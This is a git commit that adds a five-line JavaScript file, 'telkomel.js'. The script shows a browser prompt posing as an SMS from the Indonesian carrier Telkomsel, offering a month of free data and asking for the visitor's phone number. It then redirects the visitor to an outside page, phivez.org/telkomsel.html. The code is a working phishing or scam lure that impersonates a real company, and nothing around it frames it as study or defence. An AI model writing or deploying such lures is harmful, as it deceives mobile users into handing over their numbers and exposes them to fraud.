f84d30e1a770641fa8f228c3e01a284dfa65d781
newblog13 <sweet16guyz@gmail.com>
2026-01-29 22:37:45 +0100

    Create telkomel.js

---
+++ telkomel.js
@@ -0,0 +1,5 @@
+var password = 'DARA GRATIS 1 BULAN'
+password=prompt('SMS: Selamat, Nomor Telkomsel Anda berhak menerima Data Gratis 1 Bulan, klik OK untuk Memasukkan Nomor Ponsel Anda','DARA GRATIS 1 BULAN');
+if (password != 'DARA GRATIS 1 BULAN') {
+location.href='https://phivez.org/telkomsel.html';
+}
